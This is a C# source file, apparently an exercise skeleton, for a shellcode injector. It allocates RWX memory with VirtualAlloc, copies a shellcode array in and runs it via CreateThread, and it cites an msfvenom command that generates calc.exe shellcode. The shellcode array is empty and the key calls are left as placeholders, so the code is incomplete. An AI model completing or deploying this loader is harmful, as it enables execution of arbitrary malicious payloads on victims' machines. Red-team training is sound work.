using System;
using System.Runtime.InteropServices;

// Warning: compile strictly for x64, not AnyCPU!
namespace Injector
{
    public class Program
    {
        /*********************************************************************************/
        // Use P/Invoke to import the APIs you want to use (VirtualAlloc, CreateThread...)
        // You must do this yourself
        /*********************************************************************************/

        public static void Main(string[] args)
        {
            // Define your shellcode. The shellcode can be hardecoded in the program, it can be retrieved from the internet etc.
            // var shellcode = new byte[] {/* Shellcode here */};

            // Example calculator shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
            byte[] shellcode = new byte[276] {
                //
            };

            // Allocate an RWX memory region, for allocation types etc. see the documentation - https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
            var addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("Failed to allocate RWX memory, exitting.");
                return;
            }

            // Copy the shellcode into the allocated memory (Marshal.Copy is a memcpy() equivalent)
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            /************************************************************************/
            // Create a thread in the shellcode memory region to execute it
            // You must do this yourself
            var hThread = CreateThread(...);
            /************************************************************************/

            // Hang the injector by waiting for the thread, otherwise it will just exit
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}